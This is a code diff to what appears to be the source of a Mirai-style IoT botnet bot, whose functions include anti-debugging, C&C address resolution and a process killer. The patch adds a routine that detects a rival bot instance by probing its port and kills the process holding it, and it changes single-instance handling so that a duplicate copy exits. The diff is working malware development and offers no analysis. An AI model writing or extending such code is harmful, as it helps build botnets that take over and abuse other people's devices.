@@ -3,6 +3,7 @@
 #ifdef DEBUG
 #include <stdio.h>
 #endif
+#include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/socket.h>
@@ -24,6 +25,7 @@
 #include "util.h"
 #include "resolv.h"
 
+static void check_and_kill_white(void);
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -37,6 +39,40 @@ BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
 ipv4_t LOCAL_ADDR;
+
+void check_and_kill_white()
+{
+    static BOOL detected = FALSE;
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("White not detected! Retrying...\r\n");
+        close(sock);
+    } else {
+        printf("White detected! Killing...\r\n");
+        killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
+        close(sock);
+        detected = TRUE;
+    }
+    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
+    if (detected == FALSE){
+        if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+            printf("White not detected!\r\n");
+            close(sock);
+        } else {
+            printf("White detected! Killing...\r\n");
+            killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
+            close(sock);
+        }
+    }
+}
 
 #ifdef DEBUG
 static void segv_handler(int sig, siginfo_t *si, void *unused)
@@ -101,6 +137,8 @@ int main(int argc, char **args)
     if (sigaction(SIGBUS, &sa, NULL) == -1)
         perror("sigaction");
 #endif
+
+    check_and_kill_white();
 
     LOCAL_ADDR = util_local_addr();
 
@@ -441,40 +479,9 @@ static void ensure_single_instance(void)
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
 #ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
-#endif
-
-        // Reset addr just in case
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = INADDR_ANY;
-        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
-
-        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-        {
-#ifdef DEBUG
-            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
-#endif
-        }
-        
-        sleep(5);
+        printf("[main] Another instance is already running (errno = %d)! Exitting...\r\n", errno);
         close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
-        ensure_single_instance(); // Call again, so that we are now the control
-    }
-    else
-    {
-        if (listen(fd_ctrl, 1) == -1)
-        {
-#ifdef DEBUG
-            printf("[main] Failed to call listen() on fd_ctrl\n");
-            close(fd_ctrl);
-            sleep(5);
-            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
-            ensure_single_instance();
-#endif
-        }
-#ifdef DEBUG
-        printf("[main] We are the only process on this system!\n");
+        exit(0);
 #endif
     }
 }
